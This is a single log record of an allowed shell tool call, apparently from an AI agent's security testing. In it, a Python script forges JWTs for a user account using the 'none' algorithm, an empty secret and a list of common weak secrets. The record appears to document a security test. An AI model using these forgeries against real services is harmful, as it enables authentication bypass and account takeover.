{"ts": 1790645729.2634811, "decision_id": "b342b82adc2c", "tool": "run_shell", "allow": true, "reason": null, "target": "python3 << 'EOF'\nimport jwt\nimport json\n\n# Original payload\npayload = {\n    \"user_id\": \"1c0efab7-49fd-4c70-b725-33b84d076b27\",\n    \"username\": \"user_a_001\",\n    \"role\": \"user\",\n    \"exp\": 1790647136\n}\n\n# 1. Test \"none\" algorithm\ntoken_none = jwt.encode(payload, key=\"\", algorithm=\"none\")\nprint(\"=== NONE ALGORITHM ===\")\nprint(token_none)\nprint()\n\n# 2. Test with empty secret (weak secret)\ntoken_empty = jwt.encode(payload, key=\"\", algorithm=\"HS256\")\nprint(\"=== EMPTY SECRET (HS256) ===\")\nprint(token_empty)\nprint()\n\n# 3. Test with common weak secrets\nweak_secrets = [\"secret\", \"secretkey\", \"jwtsecret\", \"key\", \"password\", \"admin\", \"test\", \"123456\", \"changeme\"]\nprint(\"=== WEAK SECRETS ===\")\nfor secret in weak_secrets:\n    try:\n        token = jwt.encode(payload, key=secret, algorithm=\"HS256\")\n        print(f\"Secret '{secret}': {token}\")\n    except Exception as e:\n        print(f\"Secret '{secret}': ERROR - {e}\")\nEOF"}
